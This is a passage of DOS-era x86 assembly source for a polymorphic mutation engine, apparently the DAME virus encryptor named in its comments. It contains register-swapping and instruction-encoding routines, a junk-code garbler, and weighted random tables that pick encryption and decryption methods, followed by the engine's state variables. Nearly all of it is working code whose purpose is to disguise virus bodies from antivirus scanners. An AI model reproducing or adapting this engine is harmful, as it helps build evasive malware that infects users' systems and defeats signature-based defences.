        call    one_in_two
        js      mov_reg_reg

xchg_reg_reg:  ; ax, dx preserved
        mov     si,offset xchg_reg_reg_table
go_handle_jmp_table2:
        jmp     short go_handle_jmp_table1

_xchg_reg_reg_push_pop:
        push    dx ax dx
        call    _push                           ; PUSH REG1
        pop     ax
        call    _push                           ; PUSH REG2
        pop     ax
        call    _pop                            ; POP  REG1
        pop     ax
        jmp     _pop                            ; POP  REG2

_xchg_reg_reg_3rd_reg:
        call    free_regs
        jne     _xchg_reg_reg

        push    dx ax
        call    get_another                     ; Get free register (reg3)
        call    mov_xchg_reg_reg                ; MOV/XCHG REG3,REG2
        pop     dx
        call    xchg_reg_reg                    ; XCHG REG3,REG1
        pop     dx
        xchg    ax,dx
        call    mov_xchg_reg_reg                ; MOV/XCHG REG2,REG3
        jmp     clear_reg_dx

_xchg_reg_reg:
        or      al,al
        js      __xchg_reg_reg

        cmp     al,dl
        jg      _xchg_reg_reg_skip
        xchg    al,dl
_xchg_reg_reg_skip:
        or      dl,dl
        jz      _xchg_ax_reg
__xchg_reg_reg:
        xchg    al,dl
        mov     ah,87
        jmp     short _mod_reg_rm
_xchg_ax_reg:
        add     al,90
        stosb
        ret

xor_reg_xxxx_xor_xor:
        call    get_rand_bx
        push    bx
        xor     dx,bx
        call    xor_reg_xxxx
        pop     dx
        jmp     short xor_reg_xxxx

xor_reg_xxxx:
        mov     si,offset xor_reg_xxxx_table
        jmp     short go_handle_jmp_table2

_xor_reg_xxxx:
        or      al,030
        jmp     _81h_

xor_reg_reg:
        mov     si,offset xor_reg_reg_table
go_handle_jmp_table3:
        jmp     short go_handle_jmp_table2

_xor_reg_reg:
        mov     ah,33
; The following is the master encoder.  It handles most traditional encodings
; with mod/reg/rm or mod/xxx/rm.
_mod_reg_rm_direction:
        or      al,al                           ; If al is a memory pointer,
        js      dodirection                     ; then we need to swap regs
        or      dl,dl                           ; If dl is a memory pointer,
        js      _mod_reg_rm                     ; we cannot swap registers
        call    one_in_two                      ; Otherwise there is a 50%
        js      _mod_reg_rm                     ; chance of swapping registers
dodirection:
        xchg    al,dl                           ; Swap the registers and adjust
        sub     ah,2                            ; the opcode to compensate
_mod_reg_rm:
        shl     al,1                            ; Move al to the reg field
        shl     al,1
        shl     al,1
        or      al,dl                           ; Move dl to the rm field
mod_xxx_rm:
        or      al,al                           ; Is al a memory pointer?
        js      no_no_reg                       ; If so, skip next line

        or      al,0c0                          ; Mark register in mod field
no_no_reg:
        xchg    ah,al

        test    ah,40
        jnz     exit_mod_reg_rm

        test    cl,1
        jnz     continue_mod_xxx_rm

        push    ax
        mov     al,2e
        stosb
        pop     ax
continue_mod_xxx_rm:
        stosw

        mov     si,cs:[bp]                      ; Store the patch location
        add     si,si                           ; for the memory in the
        mov     cs:[si+bp+2],di                 ; appropriate table for later
        inc     word ptr cs:[bp]                ; adjustment
                                                ; cs: overrides needed for bp
        mov     al,_relocate_amt
        cbw
exit_mod_reg_rm:
        stosw
        ret

add_reg_reg:
        mov     si,offset add_reg_reg_table
        jmp     short go_handle_jmp_table3

_add_reg_reg:
        mov     ah,3
        jmp     short _mod_reg_rm_direction

sub_reg_reg:
        mov     si,offset sub_reg_reg_table
go_handle_jmp_table4:
        jmp     short go_handle_jmp_table3

_sub_reg_reg:
        mov     ah,2bh
        jmp     short _mod_reg_rm_direction

_add_reg_xxxx_inc_add:
        call    inc_reg
        dec     dx
        jmp     short add_reg_xxxx

_add_reg_xxxx_dec_add:
        call    dec_reg
        inc     dx
        jmp     short add_reg_xxxx

_add_reg_xxxx_add_add:
        call    get_rand_bx
        push    bx
        sub     dx,bx
        call    add_reg_xxxx
        pop     dx
        jmp     short add_reg_xxxx

add_reg_xxxx1:
        neg     dx
add_reg_xxxx:
        or      dx,dx
        jnz     cont
return1:
        ret
cont:
        mov     si,offset add_reg_xxxx_table
        jmp     go_handle_jmp_table4

_add_reg_xxxx:
        or      al,al
        jz      _add_ax_xxxx
_81h_:
        or      al,al
        js      __81h
        add     al,0c0
__81h:
        mov     ah,81
mod_xxx_rm_stosw:
        call    mod_xxx_rm
_encode_dx_:
        xchg    ax,dx
        stosw
        ret
_add_ax_xxxx:
        mov     al,5
_encode_al_dx_:
        stosb
        jmp     short _encode_dx_

sub_reg_xxxx1:
        neg     dx
sub_reg_xxxx:
_sub_reg_xxxx:
        or      dx,dx                           ; SUBtracting anything?
        jz      return1                         ; If not, we are done

        or      al,al                           ; SUB AX, XXXX?
        jz      _sub_ax_xxxx                    ; If so, we encode in 3 bytes
        add     al,028                          ; Otherwise do the standard
        jmp     short _81h_                     ; mod/reg/rm deal
_sub_ax_xxxx:
        mov     al,2dh
        jmp     short _encode_al_dx_

dec_reg:
        push    ax
        add     al,8
        jmp     short _dec_inc_reg
inc_reg:
        push    ax
_dec_inc_reg:
        or      al,al
        jns     _norm_inc
        mov     ah,0ff
        call    mod_xxx_rm
        pop     ax
        ret
_norm_inc:
        add     al,40
        stosb
        pop     ax
        ret

_mov_reg_reg_3rd_reg:
        mov     bx,offset mov_reg_reg
        mov     si,offset mov_xchg_reg_reg
        or      al,al                           ; Is reg1 a pointer register?
        js      reg_to_reg1                     ; If so, we cannot use XCHG
        jmp     short reg_to_reg

xor_reg_reg_reg_reg:
        mov     bx,offset _xor_reg_reg
        jmp     short reg_to_reg1
add_reg_reg_reg_reg:
        mov     bx,offset _add_reg_reg
        jmp     short reg_to_reg1
sub_reg_reg_reg_reg:
        mov     bx,offset _sub_reg_reg
reg_to_reg1:
        mov     si,bx
reg_to_reg:
        call    free_regs
        jne     no_free_regs

        push    ax si
        call    get_another                     ; Get unused register (reg3)
        call    mov_reg_reg                     ; MOV REG3,REG2
        pop     si dx
        xchg    ax,dx
finish_reg_clear_dx:
        push    dx
        call    si
        pop     ax
        jmp     clear_reg

_xor_reg_xxxx_reg_reg:
        mov     bx,offset xor_reg_xxxx
        mov     si,offset xor_reg_reg
xxxx_to_reg:
        call    free_regs
        jne     no_free_regs

        push    ax si
        call    get_another                     ; Get unused register (reg3)
        call    mov_reg_xxxx                    ; MOV REG3,XXXX
        xchg    ax,dx
        pop     si ax

        jmp     short finish_reg_clear_dx
no_free_regs:
        jmp     bx

_add_reg_xxxx_reg_reg:
        mov     bx,offset add_reg_xxxx
        mov     si,offset add_reg_reg
        jmp     short xxxx_to_reg

_mov_reg_xxxx_reg_reg:
        mov     bx,offset mov_reg_xxxx
        mov     si,offset mov_xchg_reg_reg
        jmp     short xxxx_to_reg

; The following are a collection of tables used by the various encoding
; routines to determine which routine will be used.  The first line in each
; table holds the mask for the encoding procedure.  The second line holds the
; default routine which is used when nesting is disabled.  The number of
; entries in each table must be a power of two.  To adjust the probability of
; the occurence of any particular routine, simply vary the number of times it
; appears in the table relative to the other routines.

; The following table governs garbling.
garbletable:
        db      garbletableend - $ - 3
        dw      offset return
        dw      offset return
        dw      offset return
        dw      offset return
        dw      offset return

        dw      offset garble_tworeg
        dw      offset garble_tworeg
        dw      offset garble_tworeg
        dw      offset garble_onereg
        dw      offset garble_onereg
        dw      offset garble_onereg

        dw      offset garble_onebyte
        dw      offset garble_onebyte
        dw      offset garble_onebyte
        dw      offset garble_jmpcond

        dw      offset clear_PIQ
garbletableend:

; This table is used by the one byte garbler.  It is intuitively obvious.
onebytetable:
        clc
        cmc
        stc
        cld
        std
        sti
        int     3
        lock

; This table is used by the one register garbler.  When each of the functions
; in the table is called, ax holds a random, unused register, and dx holds a
; random number.
oneregtable:
        db      oneregtableend - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset mov_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset dec_reg
        dw      offset inc_reg
        dw      offset _ror
        dw      offset _rol
oneregtableend:

; This table is used to determine the decryption method
oneregtable1:    ; dx = random #
        db      oneregtable1end - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset dec_reg
        dw      offset inc_reg
        dw      offset _ror
        dw      offset _rol
oneregtable1end:

; This table is used to determine the encryption method
oneregtable2:    ; dx = random #
        db      oneregtable2end - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset inc_reg
        dw      offset dec_reg
        dw      offset _rol
        dw      offset _ror
oneregtable2end:

tworegtable:    ; dl = any register
        db      tworegtableend - $ - 3
        dw      offset xor_reg_reg
        dw      offset mov_reg_reg
        dw      offset sub_reg_reg
        dw      offset add_reg_reg
tworegtableend:

tworegtable1:    ; dl = any register
        db      tworegtable1end - $ - 3
        dw      offset xor_reg_reg
        dw      offset xor_reg_reg
        dw      offset sub_reg_reg
        dw      offset add_reg_reg
tworegtable1end:

tworegtable2:    ; dl = any register
        db      tworegtable2end - $ - 3
        dw      offset xor_reg_reg
        dw      offset xor_reg_reg
        dw      offset add_reg_reg
        dw      offset sub_reg_reg
tworegtable2end:

mov_reg_xxxx_table:
        db      mov_reg_xxxx_table_end - $ - 3
        dw      offset _mov_reg_xxxx
        dw      offset _mov_reg_xxxx_reg_reg
        dw      offset _mov_reg_xxxx_mov_add
        dw      offset _mov_reg_xxxx_mov_al_ah
        dw      offset _mov_reg_xxxx_mov_xor
        dw      offset _mov_reg_xxxx_xor_add
        dw      offset _mov_reg_xxxx_mov_rol
        dw      offset _mov_reg_xxxx_mov_ror

mov_reg_xxxx_table_end:

mov_reg_reg_table:
        db      mov_reg_reg_table_end - $ - 3
        dw      offset _mov_reg_reg
        dw      offset _mov_reg_reg
        dw      offset _mov_reg_reg_3rd_reg
        dw      offset _mov_reg_reg_push_pop
mov_reg_reg_table_end:

xchg_reg_reg_table:
        db      xchg_reg_reg_table_end - $ - 3
        dw      offset _xchg_reg_reg
        dw      offset _xchg_reg_reg
        dw      offset _xchg_reg_reg_push_pop
        dw      offset _xchg_reg_reg_3rd_reg
xchg_reg_reg_table_end:

xor_reg_xxxx_table:
        db      xor_reg_xxxx_table_end - $ - 3
        dw      offset _xor_reg_xxxx
        dw      offset _xor_reg_xxxx
        dw      offset _xor_reg_xxxx_reg_reg
        dw      offset xor_reg_xxxx_xor_xor
xor_reg_xxxx_table_end:

xor_reg_reg_table:
        db      xor_reg_reg_table_end - $ - 3
        dw      offset _xor_reg_reg
        dw      offset xor_reg_reg_reg_reg
xor_reg_reg_table_end:

add_reg_reg_table:
        db      add_reg_reg_table_end - $ - 3
        dw      offset _add_reg_reg
        dw      offset add_reg_reg_reg_reg
add_reg_reg_table_end:

sub_reg_reg_table:
        db      sub_reg_reg_table_end - $ - 3
        dw      offset _sub_reg_reg
        dw      offset sub_reg_reg_reg_reg
sub_reg_reg_table_end:

add_reg_xxxx_table:
        db      add_reg_xxxx_table_end - $ - 3
        dw      offset _add_reg_xxxx
        dw      offset _add_reg_xxxx
        dw      offset _add_reg_xxxx_reg_reg
        dw      offset sub_reg_xxxx1
        dw      offset _add_reg_xxxx_inc_add
        dw      offset _add_reg_xxxx_dec_add
        dw      offset _add_reg_xxxx_add_add
        dw      offset _add_reg_xxxx_add_add

add_reg_xxxx_table_end:

endif

if not vars eq 0        ; if (vars != 0)

; _nest is needed to prevent the infinite recursion which is possible in a
; routine such as the one used by DAME.  If this value goes above the
; threshold value (defined as MAXNEST), then no further garbling/obfuscating
; will occur.
_nest                   db      ?

; This is used by the routine mod_reg_rm when encoding memory accessing
; instructions.  The value in _relocate_amt is later added to the relocation
; value to determine the final value of the memory adjustment.  For example,
; we initially have, as the encryption instruction:
;       add     [bx+0],ax
; Let's say _relocate_amt is set to 2.  Now the instruction reads:
;       add     [bx+2],ax
; Finally, the relocate procedure alters this to:
;       add     [bx+202],ax
; or whatever the appropriate value is.
;
; This value is used in double word encryptions.
_relocate_amt           db      ?

; Various memory locations which we must keep track of for calculations:
_loopstartencrypt       dw      ?
_loopstartdecrypt       dw      ?

_encryptpointer         dw      ?
_decryptpointer         dw      ?

_decryptpointer2        dw      ?

_start_encrypt          dw      ?
_start_decrypt          dw      ?
                                                        beginclear1:

; _used_regs is the register tracker. Each byte corresponds to a register.
; AX = 0, CX = 1, DX = 2, etc. Each byte may be either set or zero. If it
; is zero, then the register's current value is unimportant to the routine.
; If it is any other value, then the routine should not play with the value
; contained in the register (at least without saving it first).
_used_regs              db      8 dup (?) ; 0 = unused

; The following four variables contain the addresses in current memory which
; contain the patch locations for the memory addressing instructions, i.e.
;    XOR WORD PTR [bx+3212],3212
; It is used at the end of the master encoding routine.
_encrypt_relocate_num   dw      ?
_encrypt_relocator      dw      8 dup (?)

_decrypt_relocate_num   dw      ?
_decrypt_relocator      dw      10 dup (?)
                                                        endclear1:

_encrypt_length         dw      ?       ; The number of bytes to encrypt
                                        ; (based upon alignment)
_counter_value          dw      ?       ; Forwards or backwards
_decrypt_value          dw      ?       ; Not necessarily the crypt key
_pointer_value1         dw      ?       ; Pointer register 1's initial value
_pointer_value2         dw      ?       ; Pointer register 2's initial value

_counter_reg            db      ?
_encrypt_reg            db      ?
_pointer_reg1           db      ?       ; 4 = not in use
_pointer_reg2           db      ?

_pointer_rm             db      ?       ; Holds r/m value for pointer registers
_maxnest                db      ?

_kludge                 dw      ?

endif
